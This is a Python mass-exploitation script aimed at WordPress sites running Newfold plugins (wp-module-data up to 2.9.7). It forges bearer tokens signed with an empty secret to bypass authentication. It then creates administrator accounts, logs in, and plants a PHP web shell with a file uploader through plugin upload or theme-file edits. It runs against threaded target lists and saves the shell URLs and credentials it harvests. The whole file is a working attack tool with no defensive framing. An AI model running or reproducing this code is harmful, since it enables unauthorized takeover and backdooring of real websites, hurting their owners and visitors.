#!/usr/bin/env python3
"""
Real80099 Exploit — Newfold plugins (wp-module-data <= 2.9.7) Unauthenticated
Authentication Bypass via Bearer Token Validation with Empty Secret.
CVSS 9.8 | Pre-Auth | Auth Bypass → RCE
Author: Real
"""
import os
import sys
import re
import time
import json
import random
import string
import hashlib
import base64
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import urllib3
from colorama import init, Fore, Back, Style
init(autoreset=True)
urllib3.disable_warnings()

def show_banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""
██████╗ ███████╗ █████╗ ██╗
██╔══██╗██╔════╝██╔══██╗██║
██████╔╝█████╗  ███████║██║
██╔══██╗██╔══╝  ██╔══██║██║
██║  ██║███████╗██║  ██║███████╗
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝
        {Fore.YELLOW}Real80099 Exploit{Style.RESET_ALL} | {Fore.GREEN}Real{Style.RESET_ALL}
  --| Pre-Auth Auth Bypass → RCE | CVSS 9.8 |--\n""")

TIMEOUT = 15
THREADS = 120
OUTPUT_FILE = "shells.txt"
ADMIN_FILE = "admins.txt"
MARKER = '<a href="https://real">Real'
SHELL_CODE = '''<?php echo '<a href="https://real">Real</a><pre>'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'OK';}else{echo 'ER';}}?>'''
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
SALT_EMPTY_SECRET = hashlib.sha256(b"").hexdigest()
_lock = threading.Lock()
_hits = 0
_fails = 0
_timeouts = 0
_done = 0
_total = 0

def php_json_string(s):
    out = ['"']
    for ch in s:
        o = ord(ch)
        if ch == '"': out.append('\\"')
        elif ch == "\\": out.append('\\\\')
        elif ch == "/": out.append("\\/")
        elif ch == "\n": out.append("\\n")
        elif ch == "\r": out.append("\\r")
        elif ch == "\t": out.append("\\t")
        elif ch == "\b": out.append("\\b")
        elif ch == "\f": out.append("\\f")
        elif 0x20 <= o < 0x7F: out.append(ch)
        else:
            if o > 0xFFFF:
                v = o - 0x10000
                out.append("\\u%04x" % (0xD800 + (v >> 10)))
                out.append("\\u%04x" % (0xDC00 + (v & 0x3FF)))
            else:
                out.append("\\u%04x" % o)
    out.append('"')
    return "".join(out)

def php_json_encode(value):
    if isinstance(value, str): return php_json_string(value)
    if isinstance(value, bool): return "true" if value else "false"
    if value is None: return "null"
    if isinstance(value, int): return str(value)
    if isinstance(value, dict):
        parts = [php_json_string(str(k)) + ":" + php_json_encode(v) for k, v in value.items()]
        return "{" + ",".join(parts) + "}"
    if isinstance(value, (list, tuple)):
        items = [php_json_encode(v) for v in value]
        return "[" + ",".join(items) + "]"
    raise TypeError("unsupported type: %r" % type(value))

def forge_bearer(method, url, body="", timestamp=None):
    if timestamp is None:
        timestamp = str(int(time.time()))
    data = {"method": method, "url": url, "body": body if body is not None else "", "timestamp": timestamp}
    payload = php_json_encode(data).encode()
    h = hashlib.sha256(payload).hexdigest()
    token = hashlib.sha256((h + SALT_EMPTY_SECRET).encode()).hexdigest()
    return "Bearer " + token, timestamp

class Target:
    def __init__(self, base, timeout=15, timeout_fast=6, retries=1, verify=False, proxy=None, verbose=False):
        b = base.strip().rstrip("/")
        if not b.startswith("http"):
            b = "http://" + b
        self.base = b
        self.origin = None
        self.rest_style = None
        self.timeout = timeout
        self.timeout_fast = timeout_fast
        self.retries = retries
        self.verify = verify
        self.proxy = proxy
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = verify
        self.session.trust_env = False
        from requests.adapters import HTTPAdapter
        adapter = HTTPAdapter(pool_connections=4, pool_maxsize=16, max_retries=0)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        self.session.headers.update({"User-Agent": UA, "Accept": "application/json"})

    def _retry(self, fn, attempts=None):
        attempts = attempts or (self.retries + 1)
        last = None
        for i in range(attempts):
            try: return fn()
            except Exception as e:
                last = e
                if i + 1 < attempts: time.sleep(1.5 * (i + 1))
        raise last if last is not None else RuntimeError("retry failed")

    def get(self, url, **kw):
        kw.setdefault("timeout", self.timeout)
        kw.setdefault("allow_redirects", True)
        return self._retry(lambda: self.session.get(url, **kw))

    def get_fast(self, url, **kw):
        kw.setdefault("timeout", self.timeout_fast)
        kw.setdefault("allow_redirects", True)
        try: return self.session.get(url, **kw)
        except Exception: return None

    def resolve_rest(self):
        for style, url in (("pretty", self.base + "/wp-json/"), ("plain", self.base + "/?rest_route=/")):
            r = self.get_fast(url)
            if r is not None and r.status_code == 200:
                try: body = r.json()
                except Exception: continue
                if isinstance(body, dict) and ("routes" in body or "namespaces" in body):
                    self.rest_style = style
                    if style == "pretty":
                        self.origin = r.url.rstrip("/")
                        if not self.origin.endswith("/wp-json"):
                            self.origin = None
                            continue
                        self.origin = self.origin[:-len("/wp-json")]
                    else:
                        if "?" in r.url:
                            self.origin = r.url.split("?rest_route=")[0]
                        else:
                            self.origin = None
                            continue
                    return True
        return False

    def rest_url(self, path):
        p = path.lstrip("/")
        if "?" in p:
            route, query = p.split("?", 1)
        else:
            route, query = p, ""
        if self.rest_style == "pretty":
            url = self.origin + "/wp-json/" + route
            return url + ("?" + query if query else "")
        url = self.origin + "?rest_route=/" + route
        return url + ("&" + query if query else "")

    def forged_request(self, method, path, body=None, headers=None, extra_headers=None, timeout=None):
        url = self.rest_url(path)
        if not self.origin:
            raise RuntimeError("REST origin not resolved")
        h = {"Accept": "application/json"}
        if extra_headers: h.update(extra_headers)
        if body is not None: h["Content-Type"] = "application/json"
        req = requests.Request(method, url, data=body, headers=h)
        pre = self.session.prepare_request(req)
        auth, ts = forge_bearer(method.upper(), pre.url, body if body is not None else "")
        pre.headers["Authorization"] = auth
        pre.headers["X-Timestamp"] = ts
        if headers: pre.headers.update(headers)
        resp = self.session.send(pre, timeout=timeout or self.timeout, allow_redirects=False)
        return resp

    BRAND_PROBES = (
        ("bluehost-wordpress-plugin", "vendor/newfold-labs/wp-module-data/assets/click-events.js", "Bluehost"),
        ("wp-plugin-hostgator", "vendor/newfold-labs/wp-module-data/assets/click-events.js", "HostGator"),
        ("wp-plugin-web", "vendor/newfold-labs/wp-module-data/assets/click-events.js", "Web"),
        ("wp-plugin-crazy-domains", "vendor/newfold-labs/wp-module-data/assets/click-events.js", "Crazy Domains"),
    )

    def brand_fingerprint(self):
        for slug, asset, brand in self.BRAND_PROBES:
            r = self.get_fast(self.base + "/wp-content/plugins/%s/%s" % (slug, asset))
            if r is not None and r.status_code == 200:
                return brand
        return None

    def module_active(self):
        probe = "0" * 32
        for style in ("pretty", "plain"):
            url = self.base + ("/wp-json/newfold-data/v1/verify/" + probe if style == "pretty" else "/?rest_route=/newfold-data/v1/verify/" + probe)
            r = self.get_fast(url)
            if r is None or r.status_code == 404: continue
            try: j = r.json()
            except Exception: continue
            if isinstance(j, dict) and "valid" in j:
                self.rest_style = style
                self.origin = r.url.split("/wp-json/newfold-data")[0] if style == "pretty" else r.url.split("?rest_route=")[0]
                return True
        return False

    def probe_admin(self):
        try:
            r = self.forged_request("GET", "/wp/v2/users/me")
        except Exception as e:
            return {"vuln": False, "why": "request_error: %s" % e}
        if r.status_code == 200:
            try: j = r.json()
            except Exception: return {"vuln": False, "why": "bad_json"}
            roles = j.get("roles", [])
            if "administrator" in roles:
                return {"vuln": True, "why": "ok", "user": j.get("name") or j.get("slug"), "id": j.get("id")}
            return {"vuln": True, "why": "authenticated as non-admin", "user": j.get("slug"), "id": j.get("id")}
        return {"vuln": False, "why": "http_%d" % r.status_code}

    def rand_name(self, prefix="real"):
        return prefix + "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(6))

    def rce(self):
        log_target = self.base
        if not self.resolve_rest() and not self.module_active():
            return {"ok": False, "step": "detect", "error": "no rest/module"}
        res = self.probe_admin()
        if not res["vuln"]:
            return {"ok": False, "step": "probe", "error": res.get("why")}
        creds = {"user": self.rand_name(), "pass": "Real!" + self.rand_name("P") + "9x#", "email": self.rand_name("u") + "@example.com"}
        body = json.dumps({"username": creds["user"], "email": creds["email"], "password": creds["pass"], "roles": ["administrator"]}, separators=(",", ":"))
        r = self.forged_request("POST", "/wp/v2/users", body=body)
        if r.status_code not in (200, 201):
            return {"ok": False, "step": "create_admin", "error": "http %d" % r.status_code}
        with open(ADMIN_FILE, "a") as f:
            f.write(f"{self.base} | {creds['user']} | {creds['pass']}\n")
        login_ok = False
        try:
            r = self.forged_request("GET", "/newfold-sso/v1/sso")
            if r.status_code == 200:
                magic = r.text.strip().strip('"').replace("\\/", "/")
                from urllib.parse import urlsplit
                mp = urlsplit(magic)
                mp_path = mp.path + ("?" + mp.query if mp.query else "")
                login_url = self.base + mp_path
                adm = self.session
                adm.headers["Referer"] = self.base + "/"
                adm.get(login_url, allow_redirects=False, timeout=self.timeout)
                if any("wordpress_logged_in" in c for c in adm.cookies.get_dict()):
                    login_ok = True
        except Exception:
            pass
        
        if not login_ok:
            adm = self.session
            adm.headers["Referer"] = self.base + "/wp-login.php"
            adm.post(self.base + "/wp-login.php", data={"log": creds["user"], "pwd": creds["pass"], "wp-submit": "Log In", "redirect_to": self.base + "/wp-admin/", "testcookie": "1"}, cookies={"wordpress_test_cookie": "WP Cookie check"}, allow_redirects=True, timeout=self.timeout)
            if any("wordpress_logged_in" in c for c in adm.cookies.get_dict()):
                login_ok = True
        
        if not login_ok:
            return {"ok": False, "step": "login", "error": "login failed", "creds": creds}
        
        shell_url = self.try_plugin_upload_shell()
        if shell_url:
            return {"ok": True, "shell_url": shell_url, "creds": creds}
        
        shell_url = self.try_theme_editor_shell()
        if shell_url:
            return {"ok": True, "shell_url": shell_url, "creds": creds}
        
        return {"ok": False, "step": "upload", "error": "shell upload failed", "creds": creds}
    
    def try_plugin_upload_shell(self):
        try:
            r = self.session.get(self.base + "/wp-admin/plugin-install.php", timeout=self.timeout)
        except Exception:
            return None
        if r.status_code != 200:
            return None
        nonce_m = re.search(r'name="_wpnonce"\s+value="([a-f0-9]+)"', r.text)
        if not nonce_m:
            return None
        nonce = nonce_m.group(1)
        slug = "real" + self.rand_name("p")
        shell = f"""<?php
/* Plugin Name: {slug} */
echo '<a href="https://real">Real</a><pre>'.php_uname()."\\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';
if($_POST){{if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){{echo 'OK';}}else{{echo 'ER';}}}}
?>"""
        import io, zipfile
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("%s/%s.php" % (slug, slug), shell)
        buf.seek(0)
        files = {"zipfile": ("%s.zip" % slug, buf, "application/zip")}
        data = {"_wpnonce": nonce, "_wp_http_referer": self.base + "/wp-admin/plugin-install.php?tab=upload"}
        post = self.session.post(self.base + "/wp-admin/update.php", params={"action": "upload-plugin"}, data=data, files=files, timeout=self.timeout)
        if post.status_code != 200:
            return None
        shell_url = "%s/wp-content/plugins/%s/%s.php" % (self.base, slug, slug)
        try:
            check = self.session.get(shell_url, timeout=self.timeout)
            if MARKER in check.text:
                return shell_url
        except Exception:
            pass
        return None
    
    def try_theme_editor_shell(self):
        try:
            r = self.session.get(self.base + "/wp-admin/theme-editor.php", timeout=self.timeout)
        except Exception:
            return None
        if r.status_code != 200:
            return None
        m = re.search(r'name="theme"[^>]*>\s*<option value="([^"]+)"[^>]*\bselected', r.text, re.S)
        if not m:
            return None
        theme = m.group(1)
        for fname in ("404.php", "index.php"):
            page = self.session.get(self.base + "/wp-admin/theme-editor.php", params={"theme": theme, "file": fname}, timeout=self.timeout)
            if page.status_code != 200:
                continue
            nonce_m = re.search(r'name="(nonce|_wpnonce)"\s+value="([a-f0-9]+)"', page.text)
            if not nonce_m:
                continue
            nonce = nonce_m.group(2)
            ta = re.search(r'<textarea[^>]*name="newcontent"[^>]*>(.*?)</textarea>', page.text, re.S)
            if not ta:
                continue
            orig = ta.group(1)
            shell_code = f"""<?php
echo '<a href="https://real">Real</a><pre>'.php_uname()."\\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';
if($_POST){{if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){{echo 'OK';}}else{{echo 'ER';}}}}
?>"""
            data = {"nonce": nonce, "action": "update", "file": fname, "theme": theme, "newcontent": shell_code + "\n" + orig, "scrollto": "0"}
            post = self.session.post(self.base + "/wp-admin/theme-editor.php", params={"theme": theme, "file": fname}, data=data, timeout=self.timeout)
            if post.status_code in (200, 302):
                trigger = self.base + "/?cmd=id" if fname == "index.php" else self.base + "/" + self.rand_name("real-404-")
                try:
                    check = self.session.get(trigger, timeout=self.timeout)
                    if MARKER in check.text:
                        return trigger
                except Exception:
                    pass
        return None

def loading_line(done, total, hits, fails, timeouts):
    pct = (done / total * 100) if total else 0
    bar_len = 30
    filled = int(bar_len * done / total) if total else 0
    bar = "█" * filled + "░" * (bar_len - filled)
    return (f"\r{Fore.CYAN}[{bar}]{Style.RESET_ALL} "
            f"{Fore.WHITE}{done}/{total}{Style.RESET_ALL} "
            f"({pct:5.1f}%) "
            f"{Fore.GREEN}✔{hits}{Style.RESET_ALL} "
            f"{Fore.RED}✘{fails}{Style.RESET_ALL} "
            f"{Fore.YELLOW}⏱{timeouts}{Style.RESET_ALL}  ")

def exploit_target(target):
    global _hits, _fails, _timeouts, _done, _total
    target = target.rstrip('/')
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    try:
        t = Target(target, timeout=TIMEOUT)
        result = t.rce()
        if result.get("ok"):
            shell_url = result.get("shell_url")
            with open(OUTPUT_FILE, "a") as f:
                f.write(shell_url + "\n")
            with _lock:
                _hits += 1
                _done += 1
                sys.stdout.write("\r" + " " * 120 + "\r")
                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {shell_url} {Fore.GREEN}- [Pwned]{Style.RESET_ALL}")
                sys.stdout.write(loading_line(_done, _total, _hits, _fails, _timeouts))
                sys.stdout.flush()
            return True
        else:
            with _lock:
                _fails += 1
                _done += 1
                sys.stdout.write(loading_line(_done, _total, _hits, _fails, _timeouts))
                sys.stdout.flush()
            return False
    except requests.exceptions.Timeout:
        with _lock:
            _timeouts += 1
            _done += 1
            sys.stdout.write(loading_line(_done, _total, _hits, _fails, _timeouts))
            sys.stdout.flush()
        return False
    except Exception:
        with _lock:
            _fails += 1
            _done += 1
            sys.stdout.write(loading_line(_done, _total, _hits, _fails, _timeouts))
            sys.stdout.flush()
        return False

def main():
    global _total
    show_banner()
    target_file = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Enter Target List: ").strip()
    try:
        with open(target_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except FileNotFoundError:
        print(f"\n{Fore.RED}[!] Unable to load targets. File not found or inaccessible...{Style.RESET_ALL}")
        return
    if not targets:
        print(f"\n{Fore.RED}[!] No targets found in file...{Style.RESET_ALL}")
        return
    seen = set()
    unique = []
    for t in targets:
        k = t.rstrip("/").lower()
        if k not in seen:
            seen.add(k)
            unique.append(t)
    targets = unique
    _total = len(targets)
    open(OUTPUT_FILE, "w").close()
    open(ADMIN_FILE, "w").close()
    print(f"\n{Fore.CYAN}[INFO]{Fore.WHITE} Real80099 initialized. {_total} targets loaded. Scanning...{Style.RESET_ALL}\n")
    sys.stdout.write(loading_line(0, _total, 0, 0, 0))
    sys.stdout.flush()
    with ThreadPoolExecutor(max_workers=THREADS) as pool:
        futures = {pool.submit(exploit_target, t): t for t in targets}
        try:
            for f in as_completed(futures):
                try:
                    f.result()
                except Exception:
                    with _lock:
                        _fails += 1
                        _done += 1
                        sys.stdout.write(loading_line(_done, _total, _hits, _fails, _timeouts))
                        sys.stdout.flush()
        except KeyboardInterrupt:
            print(f"\n\n{Fore.RED}[!] Ctrl+C detected. Terminating gracefully...{Style.RESET_ALL}")
            pool.shutdown(wait=False, cancel_futures=True)
    sys.stdout.write("\r" + " " * 120 + "\r")
    print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} {_hits} shells saved to {OUTPUT_FILE}")
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Admin accounts saved to {ADMIN_FILE}")
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Scan complete. {_done}/{_total} processed.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Ctrl+C detected. Terminating gracefully...{Style.RESET_ALL}")